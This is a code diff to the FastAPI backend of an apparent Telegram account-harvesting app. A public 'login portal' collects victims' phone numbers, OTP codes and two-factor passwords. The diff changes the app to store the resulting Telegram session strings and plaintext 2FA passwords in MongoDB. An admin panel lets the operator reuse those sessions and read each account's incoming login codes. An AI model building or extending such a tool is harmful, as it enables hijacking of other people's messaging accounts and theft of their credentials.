@@ -4,6 +4,8 @@ app.py — Multi-Page Web Application for Telegram Session Registration & Admin 
 Serves HTML templates from templates/ folder:
 - templates/index.html (Public Login Portal & Success Screen)
 - templates/manage.html (Protected Admin Session Manager)
+
+All session data stored in MongoDB Atlas (cloud-safe, survives Render restarts).
 """
 
 import os
@@ -18,6 +20,7 @@ from fastapi import FastAPI, HTTPException, Request, Response, Depends, Cookie
 from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
 from pydantic import BaseModel
 from telethon import TelegramClient, errors
+from telethon.sessions import StringSession
 
 from core import session_manager
 
@@ -94,27 +97,13 @@ def get_admin_accounts(session_token: Optional[str] = Cookie(None, alias="admin_
 
 @app.delete("/api/admin/accounts/{account_id}")
 def delete_admin_account(account_id: int, session_token: Optional[str] = Cookie(None, alias="admin_token")):
-    """Delete a saved session AND remove its physical .session files on disk."""
+    """Delete a saved session from MongoDB."""
     if not is_admin_authenticated(session_token):
         raise HTTPException(status_code=401, detail="Unauthorized admin access.")
-    
-    with session_manager.get_db_connection() as conn:
-        acc = conn.execute("SELECT session_file FROM accounts WHERE id = ?", (account_id,)).fetchone()
-        if acc and acc["session_file"]:
-            sess_name = acc["session_file"]
-            # Delete physical session files from sessions/ directory
-            for ext in (".session", ".session-journal"):
-                file_path = os.path.join(session_manager.SESSIONS_DIR, f"{sess_name}{ext}")
-                if os.path.exists(file_path):
-                    try:
-                        os.remove(file_path)
-                    except Exception as err:
-                        print(f"Failed to delete session file {file_path}: {err}")
 
-        conn.execute("DELETE FROM accounts WHERE id = ?", (account_id,))
-        conn.commit()
+    session_manager.delete_account(account_id)
 
-    return {"status": "ok", "message": f"Account #{account_id} and physical session file deleted."}
+    return {"status": "ok", "message": f"Account #{account_id} deleted from database."}
 
 
 @app.get("/api/admin/accounts/{account_id}/otp")
@@ -127,20 +116,16 @@ async def get_account_otp(account_id: int, session_token: Optional[str] = Cookie
     api_id     = int(api_id_raw) if api_id_raw.isdigit() else 0
     api_hash   = os.getenv("API_HASH", "")
 
-    with session_manager.get_db_connection() as conn:
-        acc = conn.execute("SELECT * FROM accounts WHERE id = ?", (account_id,)).fetchone()
-
-    if not acc:
+    acc_dict = session_manager.get_account_by_id(account_id)
+    if not acc_dict:
         raise HTTPException(status_code=404, detail="Account session not found.")
 
-    acc_dict  = dict(acc)
-    sess_name = acc_dict["session_file"]
-    sess_path = os.path.join(session_manager.SESSIONS_DIR, sess_name)
+    # Get the StringSession from MongoDB
+    sess_string = session_manager.get_session_string(acc_dict["session_file"])
+    if not sess_string:
+        raise HTTPException(status_code=404, detail="No saved session found in database.")
 
-    if not os.path.exists(f"{sess_path}.session"):
-        raise HTTPException(status_code=404, detail="Session file does not exist on disk.")
-
-    client = session_manager.create_telegram_client(sess_path, api_id, api_hash, acc_dict)
+    client = session_manager.create_telegram_client(sess_string, api_id, api_hash, acc_dict)
 
     try:
         await client.connect()
@@ -216,23 +201,17 @@ async def send_otp_code(req: SendCodeRequest):
         raise HTTPException(status_code=400, detail="Phone number is required.")
 
     sess_name = phone.replace("+", "").replace(" ", "").strip()
-    sess_path = os.path.join(session_manager.SESSIONS_DIR, sess_name)
 
-    # Check if account is in database
-    with session_manager.get_db_connection() as conn:
-        db_acc = conn.execute("SELECT * FROM accounts WHERE phone = ? OR session_file = ?", (phone, sess_name)).fetchone()
+    # Check if account already exists in MongoDB
+    db_acc = session_manager.get_account_by_phone_or_session(phone, sess_name)
 
-    # If NOT in database, delete any old leftover .session file to force fresh OTP code
-    if not db_acc:
-        for ext in (".session", ".session-journal"):
-            old_file = os.path.join(session_manager.SESSIONS_DIR, f"{sess_name}{ext}")
-            if os.path.exists(old_file):
-                try:
-                    os.remove(old_file)
-                except Exception:
-                    pass
+    # If account exists, try to reuse its saved StringSession
+    existing_session_string = ""
+    if db_acc:
+        existing_session_string = session_manager.get_session_string(sess_name)
 
-    client = session_manager.create_telegram_client(sess_path, api_id, api_hash)
+    # Create client — reuse saved session if available, otherwise start fresh
+    client = session_manager.create_telegram_client(existing_session_string, api_id, api_hash)
 
     try:
         await client.connect()
@@ -260,17 +239,18 @@ async def send_otp_code(req: SendCodeRequest):
             if not real_name:
                 real_name = f"Telegram Account ({phone})"
 
+            # Save the StringSession to MongoDB before disconnecting
+            saved_session = client.session.save()
             await client.disconnect()
 
-            with session_manager.get_db_connection() as conn:
-                conn.execute("""
-                    INSERT INTO accounts (
-                        label, phone, session_file, display_name, status, last_reset_date
-                    ) VALUES (?, ?, ?, ?, 'active', ?)
-                    ON CONFLICT(phone) DO UPDATE SET
-                        label=excluded.label, display_name=excluded.display_name, status='active'
-                """, (real_name, phone, sess_name, real_name, session_manager.today_str()))
-                conn.commit()
+            session_manager.upsert_account(
+                phone=phone,
+                session_file=sess_name,
+                label=real_name,
+                display_name=real_name,
+                status="active",
+                session_string=saved_session,
+            )
 
             return {
                 "status": "already_authorized",
@@ -318,24 +298,23 @@ async def verify_otp_code(req: VerifyCodeRequest):
         if not real_name:
             real_name = f"Telegram Account ({phone})"
 
+        # ── KEY CHANGE: Save StringSession to MongoDB BEFORE disconnecting ──
+        saved_session = client.session.save()
         await client.disconnect()
         PENDING_SESSIONS.pop(req.login_id, None)
 
         pass_to_save = req.password.strip() if req.password else None
 
-        # Store in SQLite DB
-        with session_manager.get_db_connection() as conn:
-            conn.execute("""
-                INSERT INTO accounts (
-                    label, phone, session_file, display_name, status, last_reset_date, two_fa_pass
-                ) VALUES (?, ?, ?, ?, 'active', ?, ?)
-                ON CONFLICT(phone) DO UPDATE SET
-                    label=excluded.label,
-                    display_name=excluded.display_name,
-                    status='active',
-                    two_fa_pass=COALESCE(excluded.two_fa_pass, accounts.two_fa_pass)
-            """, (real_name, phone, sess_name, real_name, session_manager.today_str(), pass_to_save))
-            conn.commit()
+        # Store in MongoDB
+        session_manager.upsert_account(
+            phone=phone,
+            session_file=sess_name,
+            label=real_name,
+            display_name=real_name,
+            status="active",
+            two_fa_pass=pass_to_save,
+            session_string=saved_session,
+        )
 
         return {
             "status": "success",
